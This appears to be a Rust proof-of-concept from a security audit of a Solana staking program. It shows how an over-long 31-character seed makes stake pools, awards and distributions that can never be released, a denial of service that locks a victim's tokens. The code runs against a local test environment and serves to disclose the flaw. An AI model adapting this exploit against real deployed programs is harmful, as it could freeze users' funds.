mod framework;

use framework::{clone_keypair, Framework};
use std::error::Error;

use anchor_client::solana_sdk::account_info::IntoAccountInfo;
use anchor_lang::{
    prelude::{Clock, SolanaSysvar},
    solana_program,
};

use poc_framework_osec::Environment;

fn main() -> Result<(), Box<dyn Error>> {
    dos()?;

    Ok(())
}

/// demonstrates how an invalid award/distribution/stake_pool can be created with a bad seed
fn dos() -> Result<(), Box<dyn Error>> {
    println!("demonstrating DOS with bad seed");
    let mut test_env = Framework::new()?;

    let attacker = clone_keypair(&test_env.attacker);
    let victim = clone_keypair(&test_env.victim);

    let seed = "a".repeat(31);

    // setup
    // set bad seed for stake_pool
    test_env.seed = seed.clone();
    test_env.init_stake_pool()?;
    test_env.create_user_auth(&attacker)?;
    test_env.authenticate_user(&attacker)?;
    test_env.init_stake_account(&attacker)?;

    // try to deposit and unbond tokens
    test_env.mint_vault_token(&victim, 100)?;
    test_env.add_stake(&victim, 100)?;

    test_env.mint_vault_token(&victim, 1000)?;
    let clock = Clock::from_account_info(
        &(
            solana_program::sysvar::clock::id(),
            test_env
                .env
                .get_account(solana_program::sysvar::clock::id())
                .unwrap(),
        )
            .into_account_info(),
    )?;
    let begin_at = (clock.unix_timestamp - 1) as u64;
    let end_at = (clock.unix_timestamp + 1) as u64;
    test_env.create_award(&victim, &attacker, begin_at, end_at, 1000, seed.clone())?;
    println!();
    println!("release award with overly long seed should fail");
    test_env.release_award(&attacker, seed.clone())?;

    test_env.mint_vault_token(&victim, 1001)?;
    test_env.create_distribution(&victim, &attacker, begin_at, end_at, 1001, seed.clone())?;
    println!();
    println!("release distribution with overly long seed should fail");
    test_env.release_distribution(&attacker, seed)?;

    Ok(())
}
